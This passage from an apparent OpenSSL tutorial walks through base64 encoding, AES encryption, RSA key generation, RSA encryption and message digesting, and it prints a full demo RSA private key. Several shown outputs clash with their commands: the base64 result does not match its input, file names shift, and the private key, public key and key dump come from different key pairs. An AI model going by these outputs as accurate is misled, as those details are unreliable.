  &lt;li&gt;&lt;strong&gt;x509&lt;/strong&gt;: Data management for X509.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;2-secret-key-algorithms&quot;&gt;2-SECRET KEY ALGORITHMS&lt;/h1&gt;

&lt;p&gt;It is possible to implement various types of secret key algorithms with OpenSSL. Here is the list of them.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;
...
...
...
Cipher commands:
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      &lt;span class=&quot;nb&quot;&gt;base64            
&lt;/span&gt;bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
idea              idea-cbc          idea-cfb          idea-ecb          
idea-ofb          rc2               rc2-40-cbc        rc2-64-cbc        
rc2-cbc           rc2-cfb           rc2-ecb           rc2-ofb           
rc4               rc4-40            seed              seed-cbc          
seed-cfb          seed-ecb          seed-ofb          sm4-cbc           
sm4-cfb           sm4-ctr           sm4-ecb           sm4-ofb           &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The list includes the &lt;em&gt;base64&lt;/em&gt; encoding standard. It is not a secret key algorithm since no secret key generated for
base64. This encoding standard converts binary input into alphanumeric characters and vice versa.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;www.bbsec.net&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; plaintext.txt
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; textfile.txt
YmJzZWNuZXQK
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YmJzZWNuZXQK&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; encoded.txt
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; encoded.txt
bbsecnet&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;
On the contrary, &lt;a href=&quot;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&quot;&gt;Advanced Encryption Standard (AES)&lt;/a&gt; is indeed a secret key algorithm.
AES algorithm requires a secret password as a key to encrypt data. So let us see how it works.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-aes-256-cbc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pbkdf2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; plaintext.txt &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; encrtpyed.bin
enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:

root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;encrtyped.bin
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Salted__W���U�j���í��R&apos;���#��b�&quot;&lt;/span&gt;
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hexdump encrtpyed.bin 
0000000 6153 746c 6465 5f5f d357 dfd9 dd55 856a
0000010 aab8 adc3 a881 2752 f6b5 23f5 84a8 fe62
0000020
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file encrtpyed.bin 
encrtpyed.bin: openssl encrypted data with salted password

root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-aes-256-cbc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pbkdf2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; encrtpyed.bin &lt;span class=&quot;nt&quot;&gt;-pass&lt;/span&gt; pass:111111
www.bbsec.net&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-public-key-cryptography&quot;&gt;3-PUBLIC KEY CRYPTOGRAPHY&lt;/h1&gt;

&lt;p&gt;This section will demonstrate how the OpenSSL manages public key algorithms. Therefore we will use one of the most common
public-key cryptography algorithm RSA.&lt;/p&gt;

&lt;h2 id=&quot;31-generating-the-key-pair&quot;&gt;3.1-Generating the Key Pair&lt;/h2&gt;

&lt;p&gt;First, we need to create an RSA public/private key pair. We will create a 2048 bit key.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl genrsa &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; privkey.pem 2048
Generating RSA private key, 2048 bit long modulus &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 primes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
..............+++++
......................................................................................................+++++
e is 65537 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x010001&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;privkey.pem 
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4tX0r+2pX9Mssky5Kz9ZNEvDswLjzNgO8cojNA6eHA8VSSGr
XUsbewpH89wAgZzmEk2whV28ktMh7y75HSm3b7D7bpun8ODACLaA5TpsMNdJtrG+
6kjw0Sex6RMOHoLya5Bv2bD+AtqqLNKTo5rBwKPpYs2fPOeTVFomSnyO6S1GiBNM
KD8AdBk7bLS9ejsqyv6j9q2fiL6SDeNFXup9mF3e+lb0wXfpkP7db4m06Ci1zkSb
cv4bDNXS/P0As+1Rjbu9QCFhypUFdfwR1BHl7fYxIY/HCxMXWq0xXlxmGybEGCn7
UJWWgDvqx4PbmueXWIOuAtHJ/wu6HXH43/4ztQIDAQABAoIBAA94tGXDegf1KVlH
7mFKwtTUThbJnav9GJfZR6lnTdVwGe2RBFUqqEcuHlY9rTMp9m9NKTsPd6s0B15+
/7LDg6V0ltGmgD/ntHFjsUrxPyvdo0N4wCLOss4xPOs+x3nBSLOZeGeKsOiU7YJ9
ImDIT2rKQ0Lf73qB+QSJ2Y6/DChPM17d4ZnI8gfINlrOLAvl8VAZTX+4HP7wOYAW
m9nwZ8NXvudjk6vFs5m2K2t5iZpANeLMmmTanfM4/vhHBWyVAJfT/ZpBts3Agwdw
RltplK+n/4/G1AzyoQpQcuNmuATSNqiiLuAno+UM6oqY1t31q0jObHpRIfEcS6Bo
8YhTXskCgYEA8jM6p22JYv4WGoyEdiPeVJwMFj2AoTpdqEo19+fkvHhI1MBN8E7d
qJ+mP3wChP2GEmDeW+wOqRAncJlVbh/nfH/t4WWUv6pYIwWfJ8IvgeWzbz8Wdat+
y72ut+Mu5CCIfOmZi9K58+2ObMlNFR87yK3mRsl/fa5X2fJi9i2rb6sCgYEA78Ke
qKSSWM8cjHyB5dvN0dQUtcEZ8EWagJjyX9/tfRond4x6PPQvTtX742I8GdJ6T95s
esatTw+kEIim5wSXsM+wdEtMFfU1n6oEYrMpg+sgyIp72QDQi3kr/j5Dpb4DOAOQ
Hrh5Pbyq/uFFPPzX1aBSphCRKqBLmcyk1X6dCh8CgYEA8Pc9DOSzApVPAnz5MN0A
z2cts1bfSglasxuaVBoX/dcihuEI6eRdLe4gphrIGu5tXI2ZzRSvhU64HpO/ZkBB
vCE/V7gL5SEibT2jmhfd0jvpaO34d3v3O9dtJDDYL0ma4cQ76tvt/B1GTT99/FzF
yyQQ7i59NFqntwQrp0fKv98CgYAfolcauzQQAauroZXmBR1f7RKadJL+j8B17Tg1
jC8ijXvdmyxZtII1bahhdQmnAo1e0mMPw/0D7HViNRWIb6OwEYcfoPu1/feITH9t
omP84t4dd6AlnqTlciRq1D5KtQpprpaqZv6gNa9+F6zyAg5cQl4FSTROIn43Gbg5
7w27UwKBgQDeuuDoYqszBhembtG7sT7+5Anryw5qazYxXND1nw6ikU1T9t50wr4P
oVUmGx78XnzTrLLRXG7YNIRxyih9lk07zyvWpe+4MvLNZt2Fsv68uAFXfRhCex6i
2tuq+ge7jLSujkdU3uN8pV5VPEPs9lWsM9lrmbMjO/GMx0SHd5f49g&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;
A single privkey.pem file is created. The private key is encoded with the Privacy Enhanced Email (PEM) standard. 
That file contains both private and public keys. This is not what we want since
the private key must be kept secure while the public key should be distributed publicly since other people needs that public key to 
send encrypted messages to you (or to control if a document or a certificate has been signed by you).
&lt;br /&gt;&lt;br /&gt;The way to extract public key inside from the 
privkey.pem file as follows:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; privkey.pem &lt;span class=&quot;nt&quot;&gt;-pubout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pubkey.pem
writing RSA key
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pubkey.pem 
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzqi5qVmfLf+lCaWGbZ43
iAb3Hofr9MdIUL6i7lxIkViq8xwF90ThiKdgQ5Qn6heacXmQx0aJ9+F+HqpS47Na
aBz/NyHbzID8tSHwE6LhgS5gSsW2yl4/R5Zj3SMndZdJj9ExX6lesJDesOnzIEt7
6JMnOUinbGm9Lmtu727qBJh0KlNKmK5zUsi5ZxFcfC0onfhGWNbP1floC6KQzdY5
tS3nB7bXeuRTC4qJEYkQoXbQ3U4pLpu4vIdslwfjConBEfA9/3nWyaCXsvsSmAfC
Bl4FQVDSUjWO7mpPUujs2V+wdlH7fWXzkTmtpWOO8XtBQpYIlOqCAChpELnAv6Rf
+wIDAQAB
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; PUBLIC KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The following output indicates the details of the RSA key pair. Those details strictly related to the RSA’s algorithm therefore
if you are interested in the math behind the RSA algorithm, you can conduct a further investigation on it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; privkey.pem &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt;
RSA Private-Key: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2048 bit, 2 primes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
modulus:
    00:b3:4e:f9:71:fc:3e:af:29:f9:63:a0:38:9b:3f:
    5f:e2:0a:32:32:0c:fa:4f:c7:e7:79:b5:9b:bf:5c:
    87:9a:75:d8:1e:a6:48:09:4f:3f:95:87:aa:d7:a1:
    5d:18:a2:13:27:c4:43:03:6b:8f:e6:81:70:9c:32:
    66:8f:97:32:11:8b:3c:b4:e5:60:5c:02:c9:4a:67:
    76:00:28:68:4c:23:24:63:88:7d:14:8f:9a:6a:56:
    72:03:cd:97:d9:e8:81:9a:af:94:2b:f5:07:ef:4d:
    8b:f9:fd:d5:c7:f2:c7:91:06:89:d3:4f:dd:24:9a:
    72:60:78:aa:7d:ed:e9:07:04:78:64:9a:5f:a2:fa:
    03:24:92:9f:d5:dd:8e:b9:11:f8:dd:99:3f:03:51:
    2a:63:77:2c:d8:89:a6:0c:80:e8:5b:e4:c6:5b:10:
    c0:c8:c4:ca:46:84:c7:df:72:f9:11:7e:c2:29:81:
    e6:4c:86:c0:c4:fe:6c:a0:a7:66:83:45:44:1e:59:
    93:4c:35:fc:fb:00:67:ed:63:a3:66:e3:6b:8b:b7:
    ab:bf:f8:51:1e:af:a4:e1:09:42:41:8f:75:82:cf:
    29:2e:0e:6a:c1:19:62:f1:a0:44:bc:ad:20:06:12:
    d8:a3:fa:d8:a6:a5:5a:c5:bf:f4:9d:1a:b9:b9:5e:
    6c:6f
publicExponent: 65537 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x10001&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
privateExponent:
    00:9d:a6:81:11:23:fb:a5:1c:9d:85:67:78:7d:9e:
    f1:d9:96:a7:5d:74:25:9c:81:a1:56:54:43:74:b3:
    91:12:50:2c:4d:7e:5b:75:bb:f4:a6:ae:da:99:ad:
    e9:61:60:16:c1:6f:00:90:80:40:cc:24:e0:72:a4:
    a9:a1:f4:08:74:7e:5c:48:9c:27:e5:9e:19:86:ce:
    82:64:4f:22:ac:56:75:87:01:99:1f:bb:c6:c3:59:
    ef:f2:c2:0f:91:ea:a8:10:ed:f0:b3:d9:43:39:b6:
    8f:ac:a3:ee:13:57:b4:f9:20:ab:8b:5b:fb:8e:54:
    30:dd:fb:19:c3:90:aa:c2:9c:45:cc:a2:3f:05:57:
    4a:7a:d1:21:99:1e:bc:75:ef:8e:6d:44:48:2c:91:
    5b:2b:c7:56:44:ba:f0:7a:4a:45:de:87:6f:91:c9:
    06:9a:15:eb:3f:7b:dd:aa:47:1e:0e:8f:4c:e7:c5:
    0e:6f:b3:dd:6d:2a:99:8f:f0:8c:e1:48:e6:af:8b:
    29:3d:31:9f:94:4d:5a:76:58:42:d3:49:7d:c9:dd:
    b3:56:d0:09:8b:95:5e:08:ab:94:98:5b:9e:d4:29:
    21:8a:a6:2d:a9:2a:58:da:3f:7f:ce:0e:97:d2:06:
    a1:98:c4:4e:1f:91:05:ad:7a:d0:ab:e1:b2:69:07:
    3d:79
prime1:
    00:d8:9e:75:b1:1e:c2:f2:3f:1e:71:81:d5:6c:fe:
    40:3e:38:0d:30:2e:2c:14:36:3c:d7:09:30:58:04:
    &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt;:dd:e7:54:d2:67:67:3d:c7:79:eb:c4:c4:5b:58:
    1a:0d:db:49:c8:0b:b9:26:19:ae:da:83:29:a3:96:
    d2:c6:df:37:53:33:7e:35:5b:54:4b:32:c2:dc:76:
    f2:8a:99:56:67:87:24:53:7d:3e:aa:90:d0:a7:06:
    70:42:4d:ca:5e:31:52:49:98:c1:08:1b:e5:24:50:
    2f:41:12:d2:f3:1a:c4:c4:c6:08:11:ac:c8:29:08:
    7f:ad:02:f2:99:28:e9:f7:5b
prime2:
    00:d3:e8:11:88:df:ce:96:de:84:0f:ed:e8:52:af:
    cb:e9:6d:0b:67:b5:20:a5:1c:52:17:3c:a6:79:ca:
    65:0c:75:bd:01:d6:ce:cc:74:0d:80:de:3a:81:f5:
    d2:d6:59:84:55:2a:d2:f4:7c:be:74:6e:8d:73:d8:
    47:7c:18:33:22:f4:78:cb:83:43:b0:db:c0:eb:8e:
    cf:d9:27:10:3f:5d:10:c9:79:90:d5:31:33:f8:a2:
    27:3d:77:c5:0a:98:54:2c:89:d1:9e:c4:bf:83:88:
    21:0e:7a:b2:e3:5b:47:a9:f1:9f:21:f7:34:e2:bc:
    16:de:11:94:07:5e:c7:ff:7d
exponent1:
    00:c4:73:38:d3:0f:cd:c6:7a:1d:b6:dd:03:5c:9c:
    5c:50:d0:ee:8c:f2:62:c1:55:ca:e9:4d:89:0d:5a:
    26:58:8d:92:2c:5a:e0:93:73:93:8b:91:60:6e:62:
    c1:06:2e:08:84:a6:b5:1b:eb:90:da:d4:b6:ef:88:
    39:d1:67:e0:39:d1:6a:35:23:85:97:c9:0a:55:7c:
    7e:4b:d9:f2:35:63:a7:3b:1c:4b:b7:ce:2b:9c:3e:
    47:92:aa:0f:cc:4a:b8:90:cc:3a:cb:8a:d8:cd:8c:
    f6:bd:f2:3f:63:7f:b4:51:ac:32:e7:2c:a6:3e:28:
    59:f9:e2:c1:76:cb:57:1c:1f
exponent2:
    2f:04:45:a7:b5:e8:b3:86:c9:8c:73:3f:e1:e0:c9:
    80:90:46:40:8b:6a:a3:d7:c5:cb:0c:14:ef:de:dd:
    4e:c7:6c:d9:54:9c:eb:b6:30:2c:d0:a1:f0:a5:e7:
    52:d1:e7:cf:b1:c1:be:a7:52:e6:a8:84:d0:18:43:
    bc:1f:ee:70:aa:07:87:38:27:b3:bc:fe:70:05:6e:
    ce:82:a1:53:3d:c5:f4:bd:f9:49:a4:32:20:cf:71:
    9f:6c:cc:96:4e:38:16:ed:b9:49:dd:e3:94:3e:86:
    ff:1c:70:46:8b:c1:39:ce:b7:7d:24:c9:62:29:53:
    75:90:36:e4:ef:bd:b6:4d
coefficient:
    00:b6:68:f2:3a:23:18:0d:a1:4e:9d:df:b1:42:8b:
    a4:cb:73:64:45:96:92:df:92:a8:40:7d:5d:f2:bf:
    f6:5f:6d:3e:b9:5f:b2:d1:08:a2:6b:e8:c2:1e:a4:
    76:72:5b:bf:f1:55:41:90:f6:b4:e0:f3:76:84:a1:
    15:91:a4:bf:d9:08:ed:a4:a6:be:42:bf:7c:27:a4:
    1f:81:0f:b6:33:bf:e5:78:a3:a9:43:77:48:ec:ce:
    &lt;span class=&quot;nb&quot;&gt;fc&lt;/span&gt;:d4:55:73:a0:58:f8:fb:2b:7c:9c:7b:4e:19:dd:
    50:2d:91:a5:16:cc:68:48:7f:15:b5:2e:14:cb:82:
    41:73:29:70:a0:fc:a5:11:04&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;
To encrypt the private key and enhance its’ security, we can use symmetric key cryptography, such as DES3.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; privkey.pem &lt;span class=&quot;nt&quot;&gt;-des3&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; enc-priv-key.pem
writing RSA key
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;enc-priv-key.pem 
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,00672B83BD258084

tiqDxmmKct026+B6ZcahTuYSgWOjSJvogkjuZc+V8SUo37NOBRWv4Ie7CEfzqOOu
WKzr8gn8WFaRgfI0W+fgsXk8TZ/9yLUB/tVF3kxaM28bItvazJSkk6XLqAsqhJu8
sXhEyi69HlyYeCXdasBjZdoEc+ma5QjGP5VYZ7wZyak6jhxn2ExH+JfkS+3l9uYi
NeD61SLo7unqV44Rl+SDCYxYN6G60Jqv6wuoG8abBadEzo9nXIBMJ2gy0H1uSSqW
ECqRB4V5T4pA9RfuolCl0x76IUWY0ZLRIBLH//pGU+KBG2ZqsFIPg/Fsh/hOfCsL
rGE/rm60wuG7bUs7qbSe0ZjF6Ktu8VdkEfwzezBuhuWSgVy1UBPZxmRzYvO64yuG
k0TLFXzhwxSeR/UJ+GRQAt2e/U6MUw6E2ktUHUAIisyLqJgbU07Xg/nSBn3Lv6aU
5hABRIijp7yAK94HAFOdkliStgO0N3X/ozJyznN/JPW6Cs8GAetiIlyKbGgIxHsH
HOqjS/Zckd82+X3npqU7DFJ6uJ1BwGBQjwTL/r92OVQSp3Rj2sIkj6n087s+iHSm
Gu/w+lBSuIvJyQH8YV/6OmDUHVR6mjOOqP2xZmSN14GxlufW8f7I/iOw4bXRIaV/
PB/VXjjoh8V9VCI8Rcpm9kn/YP75iIfBQR3eYHnVP56C434vDd/moJej7JSJcxbJ
kGPo6l35XDKhZ2rekr0ePiinhYY/BK98MsYIYxxLvL55QrjHI2H0RaNmp71UDQG9
UL1d9sAWyKXSIjF2HKCRUm1+q/r9M8OLSCQBaOZ0H716dvtr7bZ+AXACO4JSYxCT
Un2LMxM78hJ3If5Kb1C/k1OCV/BVJbVaU/ySQ+OzOVncLHYBG7jm7Ezuq5DT6v/O
1KPX4/jomd2C4ZZiBK/G4hV6MT0cVFhJv+ThKLqekXQuNkbcAojf2ndowwxkeCye
nU61PISBXI7uBLmCuJEgQy4THWbCMKgL+nUHLrshwJwyaHkzXG2MMjTcOZj0RTpZ
Il3zImidoFR7JEuBl6hkJlZvljmUSIf1+hZUnYYQWhEoPx3SXVanIm/rJrgaxTxC
k7m15T0DGdhEnAcebYChx11hH/jyRuAz31LcrgzVFfvYFJHKkboAgAc7Zoi1gU+0
mDLnsW/18jWcMO6FU6+Mh5XUWoWe7tMerwYDfZKJuumxii2ufNRZXiPoLoDq4em7
d9uQspcsr+IQG7ByB+l9Y+Lk6ymPlMR34afSnG5qHUSmgB01zyV7ov1beyivOdyl
Ja9DQCuR0KcA1HvLCa1G94QiQ2AHTAsS3mBA8rDGXqOls76lmDF+m2J+7+6XB+e3
DZstVBKti0VCfZnY4l5gW+LGCUup5OUn/NJrAT3veh9TjbxSWEd2ZfA7fdS0zfjP
d7xal0w7v30eD6l4Vx7HXjm6KF9VH+uLL41exWn/8t1LmqGIKzPwRCNVOrN6NWg7
vuMKYMuBl5yza/vfMdeGIlL4fags+EMVC3yz4+xKtHTB/aRRcigNB6hBsrCo8L+S
C1Yr6FdrosL12DFP3UFFvva58jwR+EkGQfSUjZmY67PFLcn93bzkTfV8hmPFjy9j
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;
Since the private key is encrypted with DES3, you must decrypt the private key back with DES3’s passphrase when you 
want to decrypt messages encrypted with your public key.&lt;/p&gt;

&lt;h2 id=&quot;32-encryption&quot;&gt;3.2-Encryption&lt;/h2&gt;

&lt;p&gt;Since we have created the RSA key pair, we can produce a digital signature or perform encryption.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;this file will be encrtyped with rsa&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; plaintext.txt
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;plaintext.txt
this file will be encrtyped with rsa
root@bbsec:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-encrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; plaintext.txt &lt;span class=&quot;nt&quot;&gt;-pubin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; pubkey.pem &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; enc-text.txt
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;enc-text.txt 
&lt;span class=&quot;s2&quot;&gt;&quot;@X|aTvr
        3�K���G-U��qz�F��YXm8��4=v��&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$6w&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;^��̫&amp;lt;�����KH�]��
                                                      ��
��E��w-|��h;}[ݡ;)77��u��?��ޣ���Ù���P�t&apos;�T�&quot;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;
To decrypt the encrypted txt file, use the private key.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-decrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; enc-text.txt &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; privkey.pem 
this file will be encrtyped with rsa&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;33-digital-signatures&quot;&gt;3.3-Digital Signatures&lt;/h2&gt;

&lt;p&gt;In this section, we will be creating a digital signature and verifying it. Since RSA can only encrypt data smaller than or equal to
the key length, first, we compute the digest of the data to sign it. Note that in practice, the procedure is a bit more complex.
The way of doing it in the real world is to implement a schema called &lt;a href=&quot;https://crypto.stackexchange.com/questions/57607/what-is-rsa-pss-and-how-is-it-different-from-a-hash&quot;&gt;&lt;em&gt;RSA-PSS&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;331-creating-the-data-file-then-digesting-it&quot;&gt;3.3.1-Creating the data file then digesting it&lt;/h3&gt;
&lt;p&gt;In this instance, I will use the SHA1 hash function to digest the data.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;this document will be signed&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; plaintext.txt
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl dgst &lt;span class=&quot;nt&quot;&gt;-SHA1&lt;/span&gt; plaintext.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; plaintext-sha1.txt
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;plaintext-sha1.txt
SHA1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plaintext.txt&lt;span class=&quot;o&quot;&gt;)=&lt;/span&gt; dc2fe0f7a744a48ded8ce61710c385457e35296a &lt;span class=&quot;c&quot;&gt;#Data&apos;s digest&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

